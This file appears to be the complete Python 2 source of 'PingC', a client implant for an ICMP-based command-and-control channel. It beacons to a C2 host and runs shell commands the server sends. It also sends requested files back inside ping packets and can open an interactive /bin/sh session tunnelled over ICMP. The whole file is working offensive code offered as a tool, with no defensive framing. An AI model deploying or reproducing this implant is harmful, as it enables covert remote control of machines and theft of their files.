#! /usr/bin/env python

# PingC ICMP command and control client application
# by NoCow
# This is the client side application for my ICMP C2 project. The client will periodically ping the C2 server
#  and receive commands in the data portion of the reply. I am currently using Scapy for the packet building
# Usage: ./pingc.py <IP>

import fileinput
import sys
from datetime import date
import time
import signal
import subprocess as sub
from ConfigParser import SafeConfigParser
from optparse import OptionParser
import argparse
from scapy.all import *
import select
from impacket import ImpactDecoder
from impacket import ImpactPacket


def printLine(line,flag):
        logfile = file('log/pingc.log', 'a')
        if int(flag) == 2:
                logfile.write(line + '\n')
                print line
        if int(flag) == 1:
                logfile.write(line + '\n')
                if not '[D]' in str(line):
                        print line
        else:
                logfile.write(line + '\n')
        return


def pingshell(dst):
	printLine( "[D] Dst: %s" % (dst),flag)
	s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
	s.setblocking(0)
	s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
	printLine( "[*] Socket created",flag)
	
	ip = ImpactPacket.IP()
	ip.set_ip_dst(dst)

	# Create a new ICMP packet of type ECHO
	icmp = ImpactPacket.ICMP()
	icmp.set_icmp_type(icmp.ICMP_ECHO)
	response = "#"
	printLine( "[D] Response: %s" % (response), flag) 
	# Include the command as data inside the ICMP packet
	icmp.contains(ImpactPacket.Data(response))

	# Calculate its checksum
	icmp.set_icmp_cksum(0)
	icmp.auto_checksum = 1

	# Have the IP packet contain the ICMP packet (along with its payload)
	ip.contains(icmp)

	# Send it to the target host
	s.sendto(ip.get_packet(), (dst, 0))

	decoder = ImpactDecoder.IPDecoder()

	cmd = ''
	count = 0
	while 1:
		# Wait for incoming replies
		if s in select.select([ s ], [], [], 15)[0]:
			printLine("[*] Packet received from %s" % (dst),flag)
			buff = s.recv(4096)

        		if 0 == len(buff):
           			# Socket remotely closed
           			s.close()
           			return

        		# Packet received; decode and display it
        		ippacket = decoder.decode(buff)
        		icmppacket = ippacket.child()
        		# If the packet matches, report it to the user
        		# Get identifier and sequence number
        		data = icmppacket.get_data_as_string()
			if len(data) > 0:
        			if data != '\n':
					printLine("[D] Data: %s" % (str(data)),flag)
					if data.split('\n')[0] == 'exit':
                                		s.close()
						return
					# Parse command from standard input
					try:
                				shell_proc=sub.Popen(["/bin/sh", "-i"],shell=True,stdin=sub.PIPE,stdout=sub.PIPE,stderr=sub.PIPE)
        				except Exception, e:
                				printLine("[X] ERROR: %s" % (str(e)),flag)
					
					try:
						response = shell_proc.communicate(data)[0]
						printLine("[D] Response: %s" % (response),flag)

					except Exception,e:
						printLine( "[X] Error reading response",flag)
						response = 'error\n'
					response = response + '#'
					printLine("[D] Response: %s" % (response),flag)
				else:
					response = '#'
        		
			if len(response) > 1432:
				chunks, chunk_size = len(response), len(response)/1432
				printLine( "[D] Chunks: %s, chunk_size: %s" % (chunks, chunk_size),flag)
				for i in range(0, chunks, chunk_size):
					printLine( "[D] Response[%s]: %s" % (i,str(response[i:i+chunk_size])),flag)
			
					# Include the command as data inside the ICMP packet
					icmp.contains(ImpactPacket.Data(str(response[i:i+chunk_size])))

        				# Calculate its checksum
        				icmp.set_icmp_cksum(0)
        				icmp.auto_checksum = 1

        				# Have the IP packet contain the ICMP packet (along with its payload)
        				ip.contains(icmp)

        				# Send it to the target host
        				s.sendto(ip.get_packet(), (dst, 0))
					printLine( "[D] Packet sent: %s" % (response),flag)
			else:
				# Include the command as data inside the ICMP packet
                                icmp.contains(ImpactPacket.Data(response))

                                # Calculate its checksum
                                icmp.set_icmp_cksum(0)
                                icmp.auto_checksum = 1

                                # Have the IP packet contain the ICMP packet (along with its payload)
                                ip.contains(icmp)

                                # Send it to the target host
                                s.sendto(ip.get_packet(), (dst, 0))
                                printLine( "[D] Packet sent: %s" % (response),flag)
		else:
			printLine( "[*] Select timeout hit, resending empty prompt",flag)
			count = count + 1
			if count == 9:
				printLine("[X] Session lost, disconnecting",flag)
				return
			ip = ImpactPacket.IP()
        
        		ip.set_ip_dst(dst)
        
        		# Create a new ICMP packet of type ECHO
        		icmp = ImpactPacket.ICMP()
        		icmp.set_icmp_type(icmp.ICMP_ECHO)
        		prompt = '#'
        		# Include the command as data inside the ICMP packet
        		icmp.contains(ImpactPacket.Data(prompt))
        
        		# Calculate its checksum
        		icmp.set_icmp_cksum(0)
        		icmp.auto_checksum = 1
        
        		# Have the IP packet contain the ICMP packet (along with its payload)
        		ip.contains(icmp)
        
        		# Send it to the target host
        		s.sendto(ip.get_packet(), (dst, 0))
	printLine( "[*] Socket closed and returning",flag)


def getSleep():
	conf_file = 'conf/pingc.conf'
	cp = SafeConfigParser()
        cp.optionxform = str # Preserves case sensitivity
        cp.readfp(open(conf_file, 'r'))
        section = 'Main'
        sleep = cp.get(section,'sleep')
	printLine( "[*] Sleeping for %s seconds" % (sleep),flag)
	time.sleep(int(sleep))
	return	

def setSleep(sleep):
	conf_file = 'conf/pingc.conf'
	cp = SafeConfigParser()
        cp.optionxform = str # Preserves case sensitivity
        cp.readfp(open(conf_file, 'r'))
        section = 'Main'
        options = {'sleep': sleep}
        for option, value in options.items():
                cp.set(section, option, value)
        cp.write(open(conf_file, 'w'))


def getId():
	conf_file = 'conf/pingc.conf'
	printLine( "[D] Getting bot Id",flag)
	cp = SafeConfigParser()
        cp.optionxform = str # Preserves case sensitivity
        cp.readfp(open(conf_file, 'r'))
        section = 'Main'
        id = cp.get(section,'id')
	printLine( "[D] ID found: %s" % (id),flag)
	return id	

def setId(botId):
	conf_file = 'conf/pingc.conf'
	print "[D] Writing bot Id: ",botId
	cp = SafeConfigParser()
        cp.optionxform = str # Preserves case sensitivity
        cp.readfp(open(conf_file, 'r'))
        section = 'Main'
        options = {'checkedin': '1',
               'id': botId}
        for option, value in options.items():
                cp.set(section, option, value)
        cp.write(open(conf_file, 'w'))

def active():
	conf_file = 'conf/pingc.conf'
	cp = SafeConfigParser()
        cp.optionxform = str # Preserves case sensitivity
        cp.readfp(open(conf_file, 'r'))
        section = 'Main'
        printLine("[D] checking pingc.conf for checkedin",flag)
	return cp.get(section,'checkedin')

def handler(signum, frame):
        print 'Bye!'
        sys.exit()

def sendFile(dest,filename,botId):
	printLine( "[*] Sending file: %s" % (filename),flag)
	try:
		file = open(filename, 'r')
	except Exception, e:
		printLine( "[X] File error: %s" % (str(e)),flag)
		return
	startLine = '(FILE_START) ' + botId + ' ' + str(filename)
	printLine("[D] Startline: %s" % (startLine),flag)
	packet=IP(dst=dest)/ICMP()/startLine
	p=sr1(packet,timeout=1)
	for line in file:
		printLine( "[D] Sending line: %s" % (line),flag)
		sendLine = '(FILE) ' + botId + ' ' + filename + ' ' + line
		packet=IP(dst=dest)/ICMP()/sendLine
		#send(packet)
		#time.sleep(1)
		p=sr1(packet,timeout=1)
	printLine( "[D] End of file",flag)
	finishLine = '(FILE_END) ' + botId + ' ' + str(filename)
	packet=IP(dst=dest)/ICMP()/finishLine
	send(packet)

	
def sendPingRequest(dest,request,botId):
	full_request = request + ' ' + str(botId)
	if botId == '123456789':
		# Initial Checkin request
		packet=IP(dst=dest)/ICMP()/str(request)
	else:
		packet=IP(dst=dest)/ICMP()/str(full_request)
        #packet.show()
        #print "[*] Request sent to C2 server: " + request
	try:
		p=sr1(packet,timeout=10)
		#p.show()
		if p:
                	return p
        	else:
                	return
        except:
		printLine( "[X] Error receiving packet",flag)

def processReply(dest,p):
	try:
		response=p['Raw'].load
		printLine("[D] Response: %s" % response, flag)
        except:
		print "[X] Error: ", sys.exc_info()[0]
		return
	# Check ICMP data for 'run' command
        printLine( "[*] String received from C2 server: " + p['Raw'].load,flag)
        if 'run' in response:
        	printLine( "[*] Master says run command: " + response[4:],flag)
                command = response[4:]
                command.split()
                proc = sub.Popen(command,stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                output, errors = proc.communicate()
		printLine( output,flag)
                printLine( errors,flag)
	elif 'sysinfo' in response:
        	printLine( "[*] Master requesting sysinfo",flag)
		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                output, errors = proc.communicate()
                botId=getId()
		sendRequest = 'sysinfo %s %s' % (botId,output)
		p=sendPingRequest(dest,sendRequest, botId)
		if p:	
			processReply(dest,p)
		else:
			printLine("[D] No Reply found",flag)
		printLine(output,flag)
                printLine( errors,flag)
	elif 'Thanks' in response:
		printLine( "[*] Thanks received",flag)
		printLine( "[*] Sleeping for 10",flag)
		time.sleep(10)
        elif 'get' in response:
		printLine( "[*] Master says give him %s" % (response[4:]),flag)
		botId=getId()
		printLine( "[D] filesSent: %s" % (str(filesSent)),flag)
		if response[4:] not in filesSent:
			sendFile(dest,response[4:], botId)
			filesSent.append(response[4:])
		else:
			printLine( "[*] File already sent...skipping",flag)
		 
	elif 'sleep' in response:
		seconds = response[6:]
                printLine("[*] Master says sleep for %s seconds" % (seconds),flag)
                printLine ("[*] Sleeping...",flag)
                setSleep(seconds)
	elif 'id=' in response:
		printLine("[*] Checked in...placing id in conf file",flag)
		setId(response[3:])
	elif 'shell' in response:
		printLine( "[*] Master wants shell, master gets shell",flag)
		time.sleep(10)
		pingshell(dest)

def main(dest,flag):
	global filesSent
	filesSent = []
       	
	# check for log directory; create if it doesn't exist
	if not os.path.exists('log'):
   		os.makedirs('log')	
 
	printLine("--------------------------------------------",flag)
        printLine("PingC.py started on %s" % (date.today()),flag)
        printLine("--------------------------------------------",flag)
        printLine("[D] flag=%s" % (flag),flag)
	while True:
		signal.signal(signal.SIGINT, handler)
		if int(active()) != 1:
			printLine("[*] Not checked in...checking in now",flag)
			proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                	output, errors = proc.communicate()
                	p=sendPingRequest(dest,'Checkin %s' % output,'123456789')
                	if p:
                        	processReply(dest,p)
                	printLine(output,flag)
                	printLine(errors,flag)
			printLine("[D] id==null",flag)
			pass
		id = getId()
		sendStr="What shall I do master?"
		p=sendPingRequest(dest,sendStr, id)
		if p:
			processReply(dest,p)
		getSleep()

if __name__ == "__main__":
  global flag
  parser = argparse.ArgumentParser(version="%prog 1.0",description="Pingc client for icmp based C2")
  parser.add_argument('dest', help='Destination IP or hostname for C2', metavar='DEST') 
  parser.add_argument("-d", "--debug", dest='debug', help="debug level 1-2", metavar="DEBUG", default=0)
  args = parser.parse_args()
  if args.debug:
  	flag = args.debug
  main(args.dest,flag)

